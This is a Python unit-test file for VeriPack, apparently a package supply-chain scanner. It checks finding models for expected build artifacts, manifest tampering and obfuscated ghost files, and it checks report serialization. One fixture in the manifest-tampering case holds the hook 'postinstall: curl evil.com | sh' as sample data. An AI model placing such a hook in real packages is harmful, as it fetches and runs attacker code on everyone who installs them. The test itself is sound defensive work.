"""
Unit tests validating VeriPack domain models, report serialization, and verdicts.
"""

import json
from veripack import __version__, __author__
from veripack.models import (
    Verdict,
    FileStatus,
    Severity,
    Archetype,
    Finding,
    ScanSummary,
    ScanReport,
)


def test_package_metadata():
    """Verify package metadata exposes semantic version and author attribution."""
    assert __version__ == "0.1.0"
    assert "Pratyancha" in __author__


def test_models_and_verdicts():
    """Verify models correctly map and represent all 3 evaluation archetypes."""
    # Case 1: Expected build artifact
    f1 = Finding(
        file_path="dist/index.js",
        verdict=Verdict.SAFE,
        status=FileStatus.EXPECTED_ARTIFACT,
        severity=Severity.INFO,
        archetype=Archetype.CASE_1_EXPECTED_BUILD,
        title="Compiled output from src/index.ts",
        explanation="Standard TypeScript compiler bundle; recognized as expected artifact.",
    )
    assert f1.verdict == Verdict.SAFE
    assert f1.status == FileStatus.EXPECTED_ARTIFACT
    assert f1.archetype == Archetype.CASE_1_EXPECTED_BUILD

    # Case 2: Manifest tampering (e.g. injected postinstall hook)
    f2 = Finding(
        file_path="package.json",
        verdict=Verdict.WARNING,
        status=FileStatus.SUSPICIOUS_HOOK,
        severity=Severity.HIGH,
        archetype=Archetype.CASE_2_MANIFEST_TAMPERING,
        title="Unauthorized postinstall lifecycle hook",
        explanation="Added 'postinstall: curl evil.com | sh' not present in upstream Git tag.",
        diff_hunk='+ "postinstall": "curl evil.com | sh"',
    )
    assert f2.verdict == Verdict.WARNING
    assert f2.status == FileStatus.SUSPICIOUS_HOOK
    assert f2.severity == Severity.HIGH

    # Case 3: Ghost obfuscated file (phantom file with high entropy)
    f3 = Finding(
        file_path="lib/x.min.js",
        verdict=Verdict.COMPROMISED,
        status=FileStatus.GHOST_OBFUSCATED,
        severity=Severity.CRITICAL,
        archetype=Archetype.CASE_3_GHOST_OBFUSCATED,
        title="Obfuscated file with no upstream source",
        explanation="High Shannon entropy (6.84) and hex payload markers; phantom injection.",
        entropy=6.84,
        ast_markers=["eval", "hex_array", "_0x4a12"],
    )
    assert f3.verdict == Verdict.COMPROMISED
    assert f3.status == FileStatus.GHOST_OBFUSCATED
    assert f3.severity == Severity.CRITICAL


def test_scan_report_serialization():
    """Verify complete scan report serialization to dictionary and JSON format."""
    summary = ScanSummary(
        total_package_files=12,
        total_source_files=9,
        matched_files=7,
        expected_artifacts=3,
        manifest_modifications=1,
        ghost_files=1,
        overall_verdict=Verdict.COMPROMISED,
        overall_score=42.5,
    )

    report = ScanReport(
        package_name="test-package",
        package_version="1.0.0",
        source_target="https://github.com/example/test-package",
        summary=summary,
        models_consulted=["qwen2.5-coder:7b"],
        provenance_verified=False,
    )

    data = report.to_dict()
    assert data["package_name"] == "test-package"
    assert data["summary"]["overall_verdict"] == Verdict.COMPROMISED
    assert data["models_consulted"] == ["qwen2.5-coder:7b"]

    json_str = json.dumps(data)
    assert "test-package" in json_str
    assert "COMPROMISED" in json_str
    assert "qwen2.5-coder:7b" in json_str
